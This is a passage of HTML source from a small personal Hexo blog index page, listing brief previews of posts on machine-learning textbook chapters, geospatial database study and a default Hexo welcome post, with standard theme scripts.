    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LUOSY'S BLOG">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2022/08/16/task01/" itemprop="url">吃瓜第一、二章</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-16T11:06:05+08:00">
                2022-08-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%90%83%E7%93%9C/" itemprop="url" rel="index">
                    <span itemprop="name">吃瓜</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>概览西瓜书+南瓜书第1、2章</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2022/08/16/task01/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luosyrrrr.github.io/2022/08/15/%E5%9C%B0%E7%90%86%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/%E5%9C%B0%E7%90%86%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LUOSY'S BLOG">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2022/08/15/%E5%9C%B0%E7%90%86%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/%E5%9C%B0%E7%90%86%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/" itemprop="url">地理空间数据库学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-15T21:50:09+08:00">
                2022-08-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%9C%B0%E7%90%86/" itemprop="url" rel="index">
                    <span itemprop="name">地理</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="地理空间数据库学习"><a href="#地理空间数据库学习" class="headerlink" title="地理空间数据库学习"></a>地理空间数据库学习</h1>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2022/08/15/%E5%9C%B0%E7%90%86%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/%E5%9C%B0%E7%90%86%E7%A9%BA%E9%97%B4%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%A6%E4%B9%A0/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luosyrrrr.github.io/2022/08/14/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LUOSY'S BLOG">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2022/08/14/hello-world/" itemprop="url">task01</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-08-14T08:50:09+08:00">
                2022-08-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index">
                    <span itemprop="name">搭建</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2022/08/14/hello-world/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  


          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%7C%7C%20archive">
              
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">LUOSY</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
